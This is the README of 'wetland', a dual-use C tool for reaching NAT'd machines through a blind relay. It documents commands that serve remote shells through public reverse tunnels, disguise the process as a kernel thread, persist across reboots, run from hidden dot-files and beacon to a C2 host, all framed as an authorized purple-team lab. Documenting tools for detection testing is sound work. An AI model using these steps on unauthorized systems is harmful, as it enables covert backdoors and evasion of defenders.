# wetland

**Connect like there is no firewall. Securely.**

`wetland` lets two machines behind NAT/firewalls reach each other knowing only a
shared secret — no port forwarding, no public IP, no certificates. Both machines
meet at a **relay** (a small server you run yourself) and then talk over an
end-to-end encrypted channel that the relay cannot read.

The project is written in C with **no external dependencies**, and builds for
**Linux, macOS and Windows**.

```
   wld -s SECRET -l -i                 wld -s SECRET -i
   (behind NAT, serves a shell)        (anywhere in the world)
            │                                   │
            │  encrypted (XChaCha20-Poly1305)   │
            └──────────────┐     ┌──────────────┘
                           ▼     ▼
                   ┌───────────────────┐
                   │  wetland-relay    │  sees only: 16-byte rendezvous
                   │  (blind rendezvous)│  address + ciphertext
                   └───────────────────┘
```

> ⚠️ **Dual-use tool.** wetland is meant for authorized remote administration,
> penetration testing, CTFs and connectivity research. Only use it on systems you
> own or are authorized to access.

---

## Contents

1. [Requirements](#requirements)
2. [Installation](#installation)
3. [Running your own relay](#running-your-own-relay)
4. [Using the client (`wld`)](#using-the-client-wld)
5. [Command reference](#command-reference)
6. [Public relay pool (`-x`)](#public-relay-pool--x)
7. [Zero-config tunnel](#zero-config-tunnel)
8. [How it works](#how-it-works)
9. [Security notes](#security-notes)
10. [Purple-team lab (`wld lab`)](#purple-team-lab-wld-lab)
11. [Troubleshooting](#troubleshooting)
12. [Platform support](#platform-support)
13. [Project layout and tests](#project-layout-and-tests)
14. [Roadmap](#roadmap)
15. [License](#license)

---

## Requirements

- A **C11 compiler** (`cc`, `clang` or `gcc`) and `make`.
- Nothing else: there are no external libraries to install.
- Optional, for Windows binaries from Linux/macOS: `mingw-w64`.
- Optional, for the test suite: a POSIX shell (`bash`).

---

## Installation

### Build from source (Linux or macOS)

```sh
git clone https://github.com/s4nntysec/wetland.git
cd wetland
make                   # builds ./bin/wld and ./bin/wetland-relay
make test              # optional: runs unit and end-to-end tests
```

### Install system-wide

```sh
sudo make install      # copies both binaries to /usr/local/bin
```

To install somewhere else, set `PREFIX`, for example
`make install PREFIX=$HOME/.local`.

### Cross-compile

```sh
make windows                        # Windows .exe files in ./dist/windows (needs mingw-w64)
```

### Windows

Windows binaries are produced by `make windows` (or by the CI workflow, which
also publishes them as artifacts). The client works in pipe and file-transfer
mode on Windows. Interactive shells (`-i`) and command execution (`-e`) on the
listening side are not available there yet; use WSL for those (see
[Platform support](#platform-support)).

After installation you have two programs:

| Program | Role |
|---------|------|
| `wetland-relay` | the rendezvous server; run it on one public host |
| `wld` | the client; run it on both machines that want to talk |

---

## Running your own relay

Both clients must point to the same relay. The relay only has to be reachable
on one TCP port from both sides, so any cheap VPS works.

```sh
./bin/wetland-relay -p 7440 -v
```

| Option | Meaning |
|--------|---------|
| `-p PORT` | port to listen on (default is the built-in port) |
| `-b ADDR` | bind to a specific address (default: all interfaces) |
| `-v` | verbose logging |

Make sure the chosen TCP port is open in the host's firewall.

### Free, always-on relay (and make it the app default)

A relay is tiny and only needs **one open TCP port on a public IP**, so a
**free-forever micro VM** is plenty:

- **Oracle Cloud "Always Free"** (ARM Ampere or AMD micro) or **Google Cloud
  always-free `e2-micro`** — both give a real VM with a public IP, free forever.
  (AWS `t2.micro` is free for 12 months only.) Any Linux VM with a public IP works.

On the VM:

```sh
# 1) get the binary (build it, or copy the released Linux build):
#    curl -fsSL -o wetland-relay https://github.com/s4nntysec/wetland/releases/download/v0.1.0/wetland-relay-linux-x86_64 && chmod +x wetland-relay
# 2) open the port in BOTH the cloud firewall (security list / VPC rule) and the OS:
sudo ufw allow 7440/tcp     # or: iptables / firewalld
# 3) keep it running across reboots with systemd:
sudo tee /etc/systemd/system/wetland-relay.service >/dev/null <<'UNIT'
[Unit]
Description=wetland relay
After=network-online.target
[Service]
ExecStart=/opt/wetland/wetland-relay -p 7440
Restart=always
User=nobody
[Install]
WantedBy=multi-user.target
UNIT
sudo mkdir -p /opt/wetland && sudo mv wetland-relay /opt/wetland/ \
  && sudo systemctl enable --now wetland-relay
```

Then **bake that relay as the client default** so nobody needs `-H/-p`:

```sh
make RELAY=<your-relay-public-ip>:7440            # Linux/macOS build
make windows RELAY=<your-relay-public-ip>:7440    # Windows build
```

Now the baked `wld` just works, anywhere, no flags:

```sh
wld -s SECRET -l -i        # listener (NAT'd box) -> meets at your relay
wld -s SECRET -i           # connector (anywhere) -> same relay, gets the shell
```

The baked relay counts as "relay specified", so `wld -l` serves through it
directly — no zero-config tunnel / port-map. `$WLD_RELAY_HOST`, `-H` or `-x`
still override it at runtime.

---

## Using the client (`wld`)

Both peers need the same **secret**. Tell the clients where the relay is either
with options or with environment variables:

```sh
export WLD_RELAY_HOST=relay.example.com   # or use -H on each command
export WLD_RELAY_PORT=7440                # or use -p on each command
```

If neither is set, `wld` uses `127.0.0.1` and the default port.

### 1. Serve a shell from the machine behind the firewall

```sh
wld -g -l -i
#   wld: generated secret: 7Kp9mXr...   <- share this out-of-band
```

- `-g` generates a strong random secret and prints it. Copy it and send it to
  the other person through a channel you trust.
- `-l` puts the client in listen mode.
- `-i` serves an interactive shell over the tunnel.

### 2. Connect from anywhere

```sh
wld -s 7Kp9mXr... -i
```

You now have an interactive shell on the first machine. Close it with the normal
shell exit (`exit`).

If the listener is not online yet, add `-w` so the client waits for it:

```sh
wld -s 7Kp9mXr... -i -w
```

### Other common uses

Transfer a file (the sender reads stdin, the receiver writes stdout):

```sh
# receiver (behind firewall)          # sender (anywhere)
wld -s SEC -l > movie.mkv             wld -s SEC < movie.mkv
```

Run a command remotely and get its output back:

```sh
# listener side
wld -s SEC -l -e 'journalctl -n50'

# client side (prints the output)
wld -s SEC
```

Pipe anything through the tunnel:

```sh
# sending a directory
tar cz ./src | wld -s SEC
# receiving it
wld -s SEC -l | tar xzv
```

Keep the secret out of the shell history by reading it from a file:

```sh
wld -k ~/.wld-secret -i        # first line of the file is the secret
```

Rotate the meeting point on the relay every 10 minutes, so that the relay cannot
link sessions by address over time:

```sh
wld -g -l -i -R 600            # listener
wld -s SEC -i -R 600           # connector
```

Both sides must use the same `-R` value and roughly synchronised clocks.

---

## Command reference

| Flag | Meaning |
|------|---------|
| `-s SECRET` | shared secret (both peers must match) |
| `-k FILE` | read the secret from the first line of a file |
| `-g` | generate a secret, print it and use it |
| `-l` | listen mode (default is connect) |
| `-i` | interactive PTY shell (the listener serves it) |
| `-e CMD` | run `CMD` and wire its stdin/stdout to the tunnel |
| `-w` | (connect) wait until the listener appears |
| `-R SECS` | rotate the rendezvous address every `SECS` seconds |
| `-H HOST` | relay host (env: `WLD_RELAY_HOST`, default `127.0.0.1`) |
| `-p PORT` | relay port (env: `WLD_RELAY_PORT`) |
| `-x` | pick a relay from the pool `WLD_RELAY_POOL`, chosen from the secret (see [Public relay pool](#public-relay-pool--x)) |
| `-M NAME` | masquerade the process name in `ps`/`/proc` (T1036), e.g. `-M '[kworker/0:0]'` — opt-in, authorized-lab use; still detectable via `/proc/pid/exe` (see [`docs/PURPLE-LAB.md`](docs/PURPLE-LAB.md)) |
| `-v` | verbose output |
| `-h` | show usage |

Typical combinations:

| Goal | Listener | Connector |
|------|----------|-----------|
| Shell | `wld -g -l -i` | `wld -s SEC -i` |
| Send a file | `wld -s SEC -l > out` | `wld -s SEC < in` |
| Remote command | `wld -s SEC -l -e CMD` | `wld -s SEC` |

Add `-w` on the connector side to wait until the listener is online.

`wld` also has a separate `lab` subcommand for authorized purple-team detection
testing — see [Purple-team lab](#purple-team-lab-wld-lab).

---

## Public relay pool (`-x`)

Don't want to pass `-H` every time? With `-x`, `wld` picks a relay from a pool
for you. The choice is **derived from the shared secret**, so both peers land on
the *same* relay automatically — no extra coordination:

```sh
export WLD_RELAY_POOL="relay1.example.net:7440,relay2.example.net,203.0.113.7:9000"

wld -s SECRET -x -l -i      # serve a shell via a pool relay
wld -s SECRET -x -i         # connect — same secret → same relay
```

Entries are `host` (uses the default port) or `host:port`, comma-separated. A
given secret always maps to the same entry; different secrets spread across the
pool.

> **There is no official public wetland relay.** The relay speaks wetland's own
> protocol, so a "public relay" is just a host running `wetland-relay`. You
> populate the pool yourself (or share one with your group). The relay is blind
> — it only ever sees a 16-byte rendezvous address and ciphertext — so running
> or using a shared one leaks nothing about your traffic. Free ways to stand one
> up: an always-free VM (Oracle Cloud, Google Cloud `e2-micro`, AWS
> free tier), or a small PaaS instance (Fly.io, Render, Railway) exposing TCP
> port 7440. You can also hard-code a default pool into `builtin_pool[]` in
> `src/client.c` if you ship your own binaries.

---

## Zero-config tunnel

If you run a **listener** (`-l`) with **no relay configured** (no `-H`, no `-x`,
no `$WLD_RELAY_HOST`) and nothing is already listening on the default relay port,
`wld` bootstraps everything itself:

1. starts a **relay in-process** (on `127.0.0.1`, an ephemeral port), and
2. exposes it through a **public reverse tunnel**,

then prints the exact command for the other side:

```sh
$ wld -g -l -i
wld: generated secret: 7Kp9mXr...
wld: no relay configured — embedded relay + pinggy tunnel...
wld: tunnel up at abcd-1-2-3-4.a.free.pinggy.link:43187 — the other side runs:
       wld -s <secret> -H abcd-1-2-3-4.a.free.pinggy.link -p 43187 -i
```

The connector just runs that line. The relay stays **blind** (sees only the
16-byte address + ciphertext); the tunnel only moves bytes, so the end-to-end
encryption is unchanged.

### Default backend: pinggy (free, no account)

By default `wld` opens a free **[pinggy](https://pinggy.io)** TCP tunnel by
spawning the system **`ssh`** (`ssh -p443 -R0:localhost:<relay> tcp@a.pinggy.io`).
No account, and it works from datacenter IPs. Its one requirement is an **`ssh`
client** — present on virtually every Linux/macOS host, and on Windows 10/11 via
the built-in **OpenSSH** client (`ssh.exe`; add it under *Settings → System →
Optional features* if missing). Free pinggy tunnels get a
random address and expire after ~60 min — just re-run `wld -l` to refresh.

### Windows: open a port on the router (no tunnel, no third party)

On **Windows**, `wld -l` first tries to make the listener reachable with **no
relay, no separate server and no third-party service** by asking the local router
to forward a port — **NAT-PMP** (RFC 6886) first, then **UPnP-IGD**:

```
wld.exe -g -l
wld: no relay configured — opened a port on the router (NAT-PMP/UPnP); no tunnel needed
wld: tunnel up at 203.0.113.7:51820 — the other side runs:
       wld -s <secret> -H 203.0.113.7 -p 51820
```

It starts the embedded relay on all interfaces, maps that port on the router,
advertises your **public IP:port**, and **removes the mapping on exit**. If the
router has UPnP/NAT-PMP disabled, or you are behind **CGNAT** (the mapped address
comes back private — carrier NAT, common on mobile/4G, and typical inside VMs with
no UPnP gateway), it falls back automatically to the **native bore tunnel**
(`bore.pub`, no `ssh` dependency) and then to the **pinggy tunnel** (ssh). So the
Windows order is: **router port map → bore → pinggy**. This port-mapping step is
Windows-only; on Linux/macOS `wld -l` uses the pinggy tunnel.

### Alternative backend: bore (no `ssh` dependency)

Set **`WLD_BORE_HOST`** (e.g. `bore.pub`) to use
**[bore](https://github.com/ekzhang/bore)** instead — the bore client is built
into `wld`, so it needs **no host binary at all**:

```sh
export WLD_BORE_HOST=bore.pub
wld -g -l -i      # -> prints: ... -H bore.pub -p <port> ...
```

> ⚠️ **bore.pub is flaky from cloud/datacenter IP ranges** (the connection to
> `bore.pub:7835` often times out there); it is reliable from a residential
> machine. That is why pinggy is the default.

### Alternative backend: self-hosted frp

Set **`WLD_FRP_SERVER`** to use [frp](https://github.com/fatedier/frp) against
your own **frps**. The frp client is native (no `frpc` binary), but to stay
dependency-light it does **not** do yamux or TLS, so the frps must set
`transport.tcpMux = false` (and accept plaintext control, the default):

```toml
# frps.toml
bindPort = 7000
auth.token = "yoursecret"      # optional
transport.tcpMux = false       # required for this client
```

```sh
export WLD_FRP_SERVER=frp.example.com WLD_FRP_TOKEN=yoursecret
wld -g -l -i      # -> prints: ... -H frp.example.com -p <port> ...
```

Backend selection: `WLD_FRP_SERVER` → frp; else `WLD_BORE_HOST` → bore; else
pinggy (default).

| Variable | Meaning |
|----------|---------|
| `WLD_BORE_HOST` / `WLD_BORE_PORT` | use bore; server (e.g. `bore.pub` / `7835`) |
| `WLD_BORE_REMOTE_PORT` | fixed public port on a private bore server (default: bore chooses) |
| `WLD_FRP_SERVER` | use frp; your frps host |
| `WLD_FRP_PORT` | frps `bindPort` (default `7000`) |
| `WLD_FRP_TOKEN` | frps `auth.token` (omit if none) |
| `WLD_FRP_REMOTE_PORT` | fixed public port (default: derived from the secret) |

Notes:
- **pinggy** and **bore** let the server **choose** the public port — `wld`
  prints the assigned `host:port` for the connector. **frp** derives the port
  from the secret by default (your frps, so you control the allowed range); pin
  bore/frp with `WLD_*_REMOTE_PORT`.
- The embedded relay and tunnel run in background threads of the listener
  process; on a one-shot pipe send (`wld -l < file`) `wld` waits for the transfer
  to drain before exiting.
- POSIX only (Linux/macOS); on Windows, pass a relay with `-H`/`-x`.
- When the listener rides an expiring tunnel (pinggy), it sends a one-time
  heads-up right after the handshake that the **connector prints** (the listener
  stays quiet): `wld: note — this link uses a free pinggy tunnel that expires in
  ~55 min; ...`.

---

## How it works

1. **Key derivation.** Both peers run the secret through a keyed BLAKE2b key
   derivation function, with a different label for each purpose. This produces
   three independent values:
   - a 16-byte **rendezvous address**: where the peers meet on the relay;
   - a 32-byte **pre-shared key (PSK)**: used to authenticate the handshake;
   - a 16-byte **ownership token**: protects the listening slot on the relay.
2. **Rendezvous.** The listener registers its rendezvous address with the relay.
   The connector asks for the same address. The relay pairs the two connections
   and forwards bytes between them. The relay learns the address and nothing else.
3. **Handshake.** Over the connected pipe, the peers perform an authenticated key
   exchange: an ephemeral X25519 Diffie-Hellman exchange mixed with the PSK,
   followed by explicit key confirmation. Anyone who does not know the secret,
   including the relay, cannot derive the session keys. An active attacker who
   does not know the secret fails the confirmation, and both ends abort.
4. **Transport.** Everything after that is sent as XChaCha20-Poly1305 encrypted
   records, with a 64-bit nonce counter per direction and length-prefixed
   framing. Half-close is supported, so pipes and `-e` commands see end-of-file
   correctly.

---

## Security notes

- **The relay is untrusted** for confidentiality and integrity. It sees the
  rendezvous address and ciphertext only. It *can* deny service (it is the
  meeting point) and, without address rotation (`-R`), it can correlate sessions
  by address.
- **Secret strength matters.** The address and PSK are only as strong as the
  secret. `-g` generates about 119 bits of randomness; do not hand-pick short
  secrets.
- **Forward secrecy.** The ephemeral keys mean that recorded traffic cannot be
  decrypted later, even if the secret is learned afterwards.
- **Key confirmation** rejects a wrong secret or an active man-in-the-middle
  before any application data flows.
- This is **independent, unaudited** software. It has not had a third-party
  review. Do not rely on it where safety or lives depend on it.

The wire format and key schedule are described in
[`docs/PROTOCOL.md`](docs/PROTOCOL.md).

---

## Purple-team lab (`wld lab`)

For **detection engineering in an authorized lab**, `wld lab` ships documented,
reversible simulations of common evasion/persistence TTPs (Atomic-Red-Team
style). Every technique is deliberately *loud*, tags its artifacts `WETLAND-LAB`,
prints an ATT&CK-mapped detection hint, and is undone by `wld lab uninstall`.

```sh
wld lab masquerade --name "[kworker/0:0]"   # T1036  process name spoofing
wld lab persist --method both                # T1053.003 / T1543.002
wld lab hide --reference /bin/ls             # T1564.001 / T1070.006
wld lab beacon --to c2:443 --as tls --profile hourly  # T1071/T1573/T1571 (C2)
wld lab detections                           # print the full detection mapping
wld lab uninstall                            # remove every WETLAND-LAB artifact
```

Any `wld lab` technique also takes **`--tunnel`**, which opens the same
zero-config public tunnel as `wld -l` (embedded relay + pinggy/bore/frp) and
prints the public `host:port` before running the technique.

**Every** technique also accepts the listener flags **`-l` / `-i` / `-e CMD`**
(plus `-s`/`-k`/`-g`/`-H`/`-M`/...), running a real listener via the client flow —
the same embedded relay + zero-config tunnel as `wld -l`. The technique's own
`--long` flags still apply:

- `wld lab masquerade -g -l -i` — shell listener shown under the fake name.
- `wld lab beacon --to c2:443 -g -l -i` — listener plus a background C2 beacon.
- `wld lab persist -s SEC -l -i` — shell listener **persisted across reboots**
  (the listener persists itself; use `-s`/`-k`, not `-g`, for a stable secret).
- `wld lab hide -s SEC -l -i` — shell listener served **from the hidden dot-file**
  (`execv`'d from it, so `ps`/`/proc/pid/exe` point at the dot-file).

Every artifact stays tagged `WETLAND-LAB`, is announced on stderr, and is removed
by `wld lab uninstall`. This is the loud, detectable lab form of a
persistent/hidden C2 listener — see [`docs/PURPLE-LAB.md`](docs/PURPLE-LAB.md).

Each technique also has a **shortcut** — drop the `lab` word and call it
directly:

```sh
wld persist --method both      # same as `wld lab persist --method both`
wld masquerade --name "[kworker/0:0]"
wld uninstall
```

These compose into a **centralized-C2 exercise**: run `wetland-relay` on a
lab box as the C2 server, point `wld lab beacon` and an E2E reverse shell
(`wld -s … -l -i -H C2 -p …`) at it, and have blue hunt the beaconing + the
long-lived outbound session. Full walkthrough in
[`docs/PURPLE-LAB.md`](docs/PURPLE-LAB.md).

> ⚠️ Authorized testing only, on systems you own or are cleared to test. The
> module is built to be *detected*, not to hide — a poor base for a real implant,
> by design. Full ATT&CK → detection guidance for blue team:
> [`docs/PURPLE-LAB.md`](docs/PURPLE-LAB.md).

---

## Troubleshooting

### `wld: no peer is listening (try -w to wait)`

The connector reached the relay but found no listener at its rendezvous address.
In order of likelihood:

1. **The two sides are not pointing at the same relay.** This is the most common
   mistake. With no `-H`/`-p` and no `WLD_RELAY_HOST`/`WLD_RELAY_PORT`, `wld`
   defaults to `127.0.0.1` — so each machine looks at *its own* localhost and they
   never meet. Point **both** sides at the same reachable relay:
   ```sh
   export WLD_RELAY_HOST=relay.example.com WLD_RELAY_PORT=7440   # on BOTH machines
   ```
2. **The secret does not match.** The rendezvous address is derived from the
   secret, so a wrong secret means the peers land on different addresses and look
   exactly like "nobody is listening". Double-check `-s` on both sides (watch for
   trailing spaces / shell quoting). Prefer `-g` on the listener and copy the
   printed secret verbatim.
3. **The listener is not up yet, or is not actually listening.** Start the
   listener with `-l` *before* the connector, or add `-w` to the connector so it
   waits.
4. **Mismatched `-R`.** If one side rotates the address (`-R SECS`) the other must
   use the same value, with roughly synchronised clocks.

> Tip: run both sides with `-v` — the verbose log shows the relay it used and the
> rendezvous attempts.

### `wld: cannot reach relay HOST:PORT: Connection refused` (or a timeout)

The relay itself is unreachable:

- The relay process is not running — start `wetland-relay -p 7440 -v` on the host.
- Wrong host/port — confirm `-H`/`-p` (or the env vars) match the relay.
- A firewall is blocking the port. On a cloud VM you often have **two** layers:
  the provider's security group **and** the host firewall. Example on Oracle
  Cloud:
  ```sh
  # 1) open the port in the VCN Security List (ingress TCP 7440 from 0.0.0.0/0)
  # 2) open it on the host too:
  sudo iptables -I INPUT -p tcp --dport 7440 -j ACCEPT && sudo netfilter-persistent save
  ```

### `wld: handshake failed: wrong secret or active MITM (connection refused)`

The peers *did* meet but the end-to-end key confirmation failed — almost always a
secret mismatch (rare address collisions aside). Re-check the secret on both ends.
This is a safety feature: no data flows until both sides prove they share the
secret.

### `wld: relay pool is empty` (with `-x`)

`-x` has no relays to choose from. Populate the pool:
```sh
export WLD_RELAY_POOL="relay1.example.net:7440,relay2.example.net,203.0.113.7:9000"
```
See [Public relay pool](#public-relay-pool--x).

### `wld: tunnel failed — relay is LOCAL-ONLY ...`

The zero-config tunnel could not be set up, so the relay is only usable on the
same host/LAN. Check, in order:

- **Default (pinggy):** needs an **`ssh` client** on the host (`command -v ssh`).
  With `-v` you'll see `[wld-pinggy] opening pinggy tunnel via ssh ...`; if ssh is
  missing or can't reach `a.pinggy.io:443`, it fails. (Free pinggy tunnels also
  expire after ~60 min — just re-run.)
- **bore (`WLD_BORE_HOST` set):** that server's control port (`bore.pub` → 7835)
  must be reachable. bore.pub is flaky from **cloud/datacenter IP ranges** (works
  from residential). Test: `timeout 8 bash -c 'exec 3<>/dev/tcp/bore.pub/7835 && echo ok'`.
- **frp (`WLD_FRP_SERVER` set):** the frps must be reachable on `WLD_FRP_PORT`
  (default `7000`), have **`transport.tcpMux = false`** (this client has no
  yamux), and `WLD_FRP_TOKEN` must match its `auth.token`. Pin a known-allowed
  public port with `WLD_FRP_REMOTE_PORT`.
- Run with `-v` to see the handshake (`[wld-pinggy]` / `[wld-bore]` /
  `[wld-frp] ...`) and the exact failure.

See [Zero-config tunnel](#zero-config-tunnel).

### The interactive shell (`-i`) does nothing / looks frozen

`-i` needs a **real terminal** on both sides. It won't behave in a pipe, a CI job
or a non-TTY context. For scripted/non-interactive use, use `-e CMD` or plain pipe
mode instead.

### Build & install

- **`make: x86_64-w64-mingw32-gcc: No such file or directory`** — the Windows
  cross-compiler is missing. Install it (Debian/Ubuntu/Cloud Shell):
  ```sh
  sudo apt-get update && sudo apt-get install -y gcc-mingw-w64-x86-64
  ```
  You only need this for `make windows`; the native Linux/macOS build does not.
- **`make: Nothing to be done for 'all'`** — not an error; the binaries are
  already up to date. Force a rebuild with `make clean && make`.
- **`install: cannot create regular file '/usr/local/bin/wld': Permission
  denied`** — use `sudo make install`, or install into a user-writable prefix:
  ```sh
  make install PREFIX=$HOME/.local        # then ensure ~/.local/bin is on PATH
  ```

### Windows: `-i` / `-e` on the listener don't work

Interactive shells and listener-side command execution need a PTY/`fork`, which
the Windows build does not have yet. Pipe mode and file transfer work; use WSL for
the rest (see [Platform support](#platform-support)).

---

## Platform support

| Platform | Relay | Client pipe / file transfer | Zero-config tunnel (`-l`) | Client exec (`-e`) / PTY shell (`-i`) |
|----------|:-----:|:---------------------------:|:-------------------------:|:-------------------------------------:|
| Linux    | ✅ | ✅ | ✅ | ✅ |
| macOS    | ✅ | ✅ | ✅ | ✅ |
| Windows  | ✅ | ✅ | ✅ (needs OpenSSH `ssh.exe`) | ⛔ (use WSL for now) |

The **zero-config listener** (`-l` with no relay reachable) works on Windows too.
On Windows it first opens a port on the router directly via **NAT-PMP / UPnP-IGD**
(no relay, server or third party — see [Zero-config tunnel](#zero-config-tunnel));
if that is unavailable (CGNAT / UPnP off) it falls back to the **pinggy tunnel**,
with the embedded relay on a Win32 thread and `ssh.exe` spawned under a Job Object
(killed with the process). The `wld lab` evasion module and the interactive PTY
shell / `-e` execution on the listening side remain POSIX-only for now — on Windows
the client uses a thread-based I/O loop because the console cannot be watched with
`WSAPoll`.

---

## Project layout and tests

```
src/wld_crypto.{c,h}   secret derivation, handshake, AEAD (the core)
src/wld_tunnel.{c,h}   non-blocking encrypted I/O loop
src/wld_net.{c,h}      socket helpers
src/wld_proto.h        relay wire protocol and framing constants
src/wld_relay.{c,h}    embeddable relay core (serve loop)
src/relay.c            wetland-relay: thin CLI wrapper around the core
src/wld_session.h      one-session runner shared by the client and wld lab
src/wld_autotunnel.{c,h}  zero-config tunnel selector (shared by -l and wld lab)
src/wld_pinggy.{c,h}   pinggy tunnel backend via ssh (zero-config default)
src/wld_bore.{c,h}     native bore reverse-tunnel client (alt backend)
src/wld_frp.{c,h}      native frp reverse-tunnel client (self-hosted option)
src/client.c           wld: the client (pipe, exec and PTY modes)
src/wld_lab.{c,h}      purple-team lab: documented, reversible TTP sims
src/monocypher/        bundled cryptographic code
tests/                 crypto unit, end-to-end, lab, pinggy/bore/frp tunnel tests
docs/PROTOCOL.md       wire format and key schedule
docs/PURPLE-LAB.md     purple-team lab: ATT&CK -> detection mapping
```

Run the tests with:

```sh
make test
```

This runs the crypto unit tests, an end-to-end test that starts a relay and two
clients on localhost, a smoke test of the `wld lab` techniques, and pinggy / bore
/ frp auto-tunnel tests against local stand-in tunnel servers.

The CI workflow (`.github/workflows/build.yml`) builds and tests on Linux,
macOS and Windows, and uploads the binaries as artifacts.

---

## Roadmap

Done since the first version: a secret-derived **public relay pool** (`-x`), a
**zero-config tunnel** for NAT'd listeners (pinggy by default, or bore / self-
hosted frp), and a **purple-team lab** module (`wld lab`).

Not yet implemented:

- SOCKS5 proxy mode
- multi-connection TCP port forwarding
- propagation of terminal window size (`SIGWINCH`)
- Tor/SOCKS egress to the relay
- relay-pool health-checking and failover
- daemon / background mode

Contributions are welcome.

---

## License

BSD-2-Clause. See [`LICENSE`](LICENSE).
